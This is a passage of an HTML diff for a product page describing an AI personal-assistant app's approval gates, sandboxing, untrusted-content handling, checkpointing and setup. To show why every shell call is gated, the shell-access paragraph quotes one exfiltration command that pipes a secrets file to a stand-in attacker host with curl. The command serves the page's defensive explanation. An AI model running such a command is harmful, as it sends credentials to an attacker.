+
+    <div class="quickstart-box">
+      <div class="quickstart-bar">typescript</div>
+      <pre>const staged = await assistant.turn('Summarize this into notes.md')
+<span style="color:var(--ink-3)">// { status: 'needs_approval', pendingActionId: '...', pendingActionKind: 'write' }</span>
+
+await assistant.turn('Summarize this into notes.md', {
+  approved: true,
+  pendingActionId: staged.pendingActionId,
+})
+<span style="color:var(--ink-3)">// applies the exact staged content — no second LLM call
+// { status: 'ok', reply: 'Wrote "notes.md".' }</span></pre>
+    </div>
+
+    <p style="margin-top:20px;">
+      Shell access goes further: <em>every</em> call is gated, with no "safe subset" the way a read is safe within the file tools — a single shell command has no structural split between reading and mutating (<code style="font-size:13px">cat secrets.env | curl attacker.com -d @-</code> does both at once). At approval time it runs with its working directory pinned to the already-validated staged path, its environment reduced to an explicit allowlist (<code style="font-size:13px">PATH</code>, <code style="font-size:13px">HOME</code>, <code style="font-size:13px">LANG</code> only — never the parent process's real env, so proxy tokens and API keys can't leak into the command), a hard timeout that kills the whole process group on expiry, and output truncated to a byte cap.
+    </p>
+
+    <p style="margin-top:20px;font-size:14.5px;color:var(--ink-3);">
+      These are real, load-bearing mitigations, not a marketing gloss — and also not a substitute for reviewing what you approve. Read what's staged before typing <code style="font-size:13px">approved: true</code>, the same way you'd review a shell command before running it yourself.
+    </p>
+
+  </div>
+</section>
+
+
+<section class="section alt" id="trust">
+  <div class="wrap prose">
+
+    <div class="section-label">TRUST BOUNDARY</div>
+    <h2>Fetched content is <em>never mistaken for an instruction.</em></h2>
+
+    <p>
+      Anything the assistant pulls in from outside the conversation — a web search result, a fetched page, the output of an approved shell command — is content it does not vouch for. Before it re-enters the transcript, it's wrapped in an explicit <code style="font-size:14px">&lt;untrusted_external_content&gt;</code> boundary, with a warning prefix added if a heuristic flags instruction-shaped text inside it. A later turn reading that content back sees it clearly marked as data, not as something to obey.
+    </p>
+
+    <p>
+      <code style="font-size:14px">fetch_url</code> also refuses to reach a private, loopback, or link-local network target — resolved and re-checked on every redirect hop, since a public URL can 302 to an internal one. This is an application-level check, not a substitute for network isolation, but it closes an easy path from "fetch this page" to hitting infrastructure that was never meant to be reachable from the model.
+    </p>
+
+    <div class="tool-callout">
+      <div class="tool-callout-label">Also gated</div>
+      <p><code style="font-size:12px">web_search</code>/<code style="font-size:12px">fetch_url</code> are read-only and execute immediately with no approval step — the same trust tier as a local read — but every result they return still crosses the same untrusted-content boundary before it can influence a later turn.</p>
+    </div>
+
+  </div>
+</section>
+
+
+<section class="section" id="resilience">
+  <div class="wrap">
+
+    <div class="section-label">RESILIENCE</div>
+    <h2>Survives a crash <em>mid-turn, not just between turns.</em></h2>
+
+    <div class="process-steps">
+
+      <div class="process-step">
+        <span class="process-step-n">Checkpoint</span>
+        <span class="process-step-title">Every iteration</span>
+        <span class="process-step-sub">The harness runtime can suspend mid-loop, yielding a serializable checkpoint after each iteration that makes real progress on the turn.</span>
+      </div>
+
+      <div class="process-step">
+        <span class="process-step-n">Persist</span>
+        <span class="process-step-title">To storage, every turn</span>
+        <span class="process-step-sub">Personal Assistant writes that checkpoint keyed to the session, then deletes it once the turn finishes normally or via escalation.</span>
+      </div>
+
+      <div class="process-step">
+        <span class="process-step-n">Resume</span>
+        <span class="process-step-title">Not restart</span>
+        <span class="process-step-sub">Call the assistant again for a session with a leftover checkpoint and it resumes the interrupted harness run instead of silently starting over.</span>
+      </div>
+
+      <div class="process-step">
+        <span class="process-step-n">Batch research</span>
+        <span class="process-step-title">Self-calibrating budget</span>
+        <span class="process-step-sub">An explicit list of lookups ("find these 7 schools' dates") gets a per-item budget that calibrates off the first couple of items, instead of the same flat step cap a single question gets.</span>
+      </div>
+
+    </div>
+
+  </div>
+</section>
+
+
+<section class="section alt" id="front-ends">
+  <div class="wrap">
+
+    <div class="section-label">ONE CORE, THREE SURFACES</div>
+    <h2>CLI, browser, or desktop —<em> your choice of storage, not of harness.</em></h2>
+
+    <p class="prose" style="margin-bottom:0;">
+      All three front ends run the identical assistant class and harness underneath. None is the "real" one with the others as afterthoughts — each just picks the storage backend that fits where it runs.
+    </p>
+
+    <div class="fe-table-wrap">
+      <table class="fe-table">
+        <tr>
+          <th>Front end</th>
+          <th>Where</th>
+          <th>Storage</th>
+        </tr>
+        <tr>
+          <td>Terminal CLI</td>
+          <td>Any terminal</td>
+          <td>Real files under <code style="font-size:12.5px">~/.buildaharness/personal-assistant/</code> — transcripts, learned experience, reminders, checkpoints</td>
+        </tr>
+        <tr>
+          <td>Browser chat UI</td>
+          <td>Any modern browser tab</td>
+          <td>IndexedDB / Dexie — best-effort persistence, survives a page reload</td>
+        </tr>
+        <tr>
+          <td>Native desktop app</td>
+          <td>macOS, Linux, Windows (Tauri)</td>
+          <td>Same browser chat UI, wrapped — but filesystem-backed under the OS app-data directory, same as the CLI</td>
+        </tr>
+      </table>
+    </div>
+
+    <div class="tool-callout" style="margin-top:24px;">
+      <div class="tool-callout-label">Model choice</div>
+      <p>Five LLM backends in total: a self-hosted proxy, direct Anthropic/OpenAI/OpenRouter API keys, or shelling out to an already-authenticated <code style="font-size:12px">claude</code> CLI session with no API key at all. The CLI and native desktop app offer all five; a plain browser tab offers the four that don't require spawning a local <code style="font-size:12px">claude</code> process — there's no way to do that from a webpage. Switch models from a running session — no restart needed.</p>
+    </div>
+
+  </div>
+</section>
+
+
+<section class="section" id="quickstart">
+  <div class="wrap prose">
+
+    <div class="section-label">RUN IT</div>
+    <h2>Three ways to run it — <em>pick the one that fits.</em></h2>
+
+    <p>
+      All three front ends live in the same monorepo and need the same one-time setup first: the two packages Personal Assistant is built on (<code style="font-size:13px">@buildaharness/harness</code>, <code style="font-size:13px">@buildaharness/runtime</code>) ship as compiled output, so they need building once before anything that imports them will run.
+    </p>
+
+    <div class="quickstart-box">
+      <div class="quickstart-bar">shell — one-time setup</div>
+      <pre>git clone https://github.com/3IVIS/buildaharness
+<span style="color:var(--ink-3)">cd</span> buildaharness
+npm install
+npm run build:harness && npm run build:runtime</pre>
+    </div>
+
+    <p style="margin-top:28px;">
+      <strong>Browser — no server, no build tooling, easiest to try.</strong> Start the chat UI's own dev server and configure everything from its Settings screen — no <code style="font-size:13px">.env</code> file, no self-hosted proxy, no Rust toolchain needed.
+    </p>
+
+    <div class="quickstart-box">
+      <div class="quickstart-bar">shell</div>
+      <pre>npm run dev:chat-ui
+<span style="color:var(--ink-3)"># open http://localhost:3010, click the gear icon (Settings),
+# pick Anthropic/OpenAI/OpenRouter under Provider, paste your API key, Save.</span></pre>
+    </div>
+
+    <p style="margin-top:28px;">
+      <strong>Terminal CLI — real files, no browser.</strong> Transcripts, learned facts, and reminders persist under <code style="font-size:13px">~/.buildaharness/personal-assistant/</code> between runs.
+    </p>
+
+    <div class="quickstart-box">
+      <div class="quickstart-bar">shell</div>
+      <pre><span style="color:var(--ink-3)"># No API key — shells out to an already-authenticated Claude Code session</span>
+ASSISTANT_LLM_BACKEND=claude-cli npm run cli --workspace=packages/personal-assistant
+
+<span style="color:var(--ink-3)"># Or a direct provider API key</span>
+ASSISTANT_LLM_BACKEND=anthropic ASSISTANT_API_KEY=sk-ant-... \
+  npm run cli --workspace=packages/personal-assistant</pre>
+    </div>
+
+    <p style="margin-top:28px;">
+      <strong>Native desktop app — a real window, not a browser tab.</strong> Same chat UI, wrapped in Tauri. This one needs an actual Rust toolchain (<a href="https://rustup.rs" style="color:var(--accent-ink);">rustup</a>; Tauri 2.11 needs <code style="font-size:13px">rustc &gt;= 1.88</code>) — the browser and CLI paths above don't.
+    </p>
+
+    <div class="quickstart-box">
+      <div class="quickstart-bar">shell</div>
+      <pre>npm run dev:desktop
+<span style="color:var(--ink-3)"># opens a native window against the same chat UI — Settings works the same way,
+# plus a native folder picker for the file-tools workspace root.</span></pre>
+    </div>
+
+    <div class="tool-callout" style="margin-top:24px;">
+      <div class="tool-callout-label">Before you paste a key in</div>
+      <p>Whichever path you pick, an API key you enter is stored in plaintext, not an OS keychain — <code style="font-size:12px">localStorage</code> in the browser build, a plain JSON config file for the CLI and desktop build. That's the same trust boundary this repo's own <code style="font-size:12px">.env</code> already has, not a new one, but it's worth knowing before you paste in a real Anthropic/OpenAI/OpenRouter key rather than a self-hosted proxy token. The <code style="font-size:12px">claude-cli</code> backend sidesteps this entirely — it needs no key of its own, only your host's already-authenticated <code style="font-size:12px">claude</code> session.</p>
+    </div>
+
+    <p style="margin-top:20px;">
+      Whichever one you pick: try a plain question first, then something with real consequence — "send an email to my boss saying I quit" — to see the risk gate return <code style="font-size:14px">needs_approval</code> before a single token is spent. This is an early-stage reference application (v0.1.0), not an audited security product — see the file/shell access sections above for exactly what is and isn't gated before turning either on. Apache 2.0, provided as-is per the license. <a href="https://github.com/3IVIS/buildaharness/tree/main/packages/personal-assistant" style="color:var(--accent-ink);">Full README on GitHub →</a>
+    </p>
+
+  </div>
+</section>
+
+
+<section class="section alt" id="faq">
+  <div class="wrap prose">
+
+    <div class="section-label">FAQ</div>
+    <h2>Questions, <em>answered.</em></h2>
+
+    <div class="faq-list">
+
+      <div class="faq-item">
+        <h3>What is the Personal Assistant?</h3>
+        <p>A general-purpose, everyday-use chat agent built on Build A Harness's own 11-layer harness runtime. Where a heavy autonomous agent decomposes an objective into a multi-task plan, it treats every chat message as one objective, one task — walking every harness layer for ordinary conversation, skipping the harness entirely for a one-shot fact lookup, and gating a consequential request like "send that email" behind explicit approval.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>Does every chat message really run the full harness?</h3>
+        <p>Every turn except a narrow one: a fail-closed classifier recognizes a genuinely self-contained factual one-liner and returns that reply directly, skipping <code style="font-size:13px">HarnessRuntime.run()</code>. Everything else — ordinary conversation, anything worth decomposing, anything consequential — walks World Model, Evidence &amp; Reasoning, Hypothesis, Contradiction, Diagnostics, Control State, Planning, Execution, Verification, Recovery, and the Reviewer Pass. Either way, the harness loop itself adds no LLM call of its own — it's synchronous bookkeeping over the reply already produced. That reply still costs one real model call, and a few narrow, cheaply-gated classifiers elsewhere in the turn (an ambiguous risk read, a compound-looking request, plan start/abandonment, long tool output checked for injected instructions) can each add one more when their own keyword check can't resolve it confidently.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>How does it decide what needs approval?</h3>
+        <p>Two independent gates. A cheap keyword risk classifier flags consequential message content before the harness runs — a message the keyword list alone catches returns <code style="font-size:13px">needs_approval</code> at zero LLM cost; one that reads LOW-risk by keyword but still looks action-shaped costs one extra classification call as a second opinion first, and can still come back requiring approval. Separately, any <code style="font-size:13px">write_file</code> or <code style="font-size:13px">run_shell_command</code> tool call always stages its effect as a pending action rather than executing inline, and only applies once the caller replies with <code style="font-size:13px">approved: true</code> and the matching pending action ID.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>What happens if it crashes mid-turn?</h3>
+        <p>The harness runtime can suspend mid-loop and yields a serializable checkpoint after each iteration that makes progress. Personal Assistant writes that checkpoint for every turn that actually reaches <code style="font-size:13px">HarnessRuntime.run()</code> — not a one-shot fact lookup or one the risk gate stops cold, neither of which starts a harness run to checkpoint — and deletes it once the turn finishes. Calling it again for a session with a leftover checkpoint resumes the interrupted run instead of silently starting over.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>Where does it run?</h3>
+        <p>Three front ends share one core: a terminal CLI and a native desktop app (both filesystem-backed), and a browser chat UI (IndexedDB/Dexie-backed). None is more "real" than the others — same assistant class, same harness, different storage adapter.</p>
+      </div>
+
+      <div class="faq-item">
+        <h3>What stops file and shell access from being dangerous?</h3>
+        <p>Both are opt-in and off by default. File tools are scoped to one sandboxed workspace root with path-traversal and symlink-escape checks; <code style="font-size:13px">write_file</code> always stages instead of executing. Shell access is gated on every single call, runs with an environment allowlist, a hard timeout, and output truncation. Content fetched from the shell or the web is wrapped as untrusted before it re-enters the conversation, so it can't be mistaken for an instruction from the user. None of that makes shell access risk-free — it's a real trust decision these mitigations make <em>safer</em>, not a substitute for deciding whether to turn it on at all. This is an early-stage reference app (v0.1.0), not an independently audited security boundary.</p>
+      </div>
+
+    </div>
+
+  </div>
+</section>
+
+
+<section class="cta-section">
+  <div class="wrap">
+    <div class="cta-inner">
+      <div class="cta-text">
+        <div class="section-label">BUILD A HARNESS · PERSONAL ASSISTANT</div>
+        <h2>The harness, <em>talking back.</em></h2>
+        <p>A working reference application, not a demo — the same 11-layer harness architecture, risk gating, tool staging, and crash-safe checkpointing running on real everyday conversations. Apache 2.0. Runs from a terminal, a browser tab, or a native desktop app.</p>
+      </div>
+      <div class="cta-actions">
+        <a class="btn" href="https://github.com/3IVIS/buildaharness/tree/main/packages/personal-assistant">Get the package — GitHub</a>
+        <a class="btn btn-ghost" href="/harness-engineering">Read the harness engineering discipline →</a>
+        <a class="btn btn-ghost" href="/harness-comparison">See the harness comparison →</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+
+<footer>
+  <div class="wrap footer-inner">
+    <div class="footer-links">
+      <a href="https://github.com/3IVIS/buildaharness">GitHub</a>
+      <a href="https://github.com/3IVIS/buildaharness/tree/main/packages/personal-assistant">Personal Assistant</a>
+      <a href="https://github.com/3IVIS/buildaharness/discussions">Discussions</a>
+      <a href="https://github.com/3IVIS/buildaharness/blob/main/LICENSE">Apache 2.0</a>
+      <a href="/">Build A Harness</a>
+      <a href="/harness-engineering">Harness engineering</a>
+      <a href="/harness-comparison">Harness comparison</a>
+      <a href="/privacy.html">Privacy</a>
+      <a href="/impressum.html">Impressum</a>
+      <a href="#" onclick="if(window.klaro)klaro.show();return false;">Cookie Settings</a>
+    </div>
+    <div class="footer-tag">
+      Build your harness. Ship it anywhere.
+    </div>
+  </div>
+</footer>
+
+</body>
+</html>
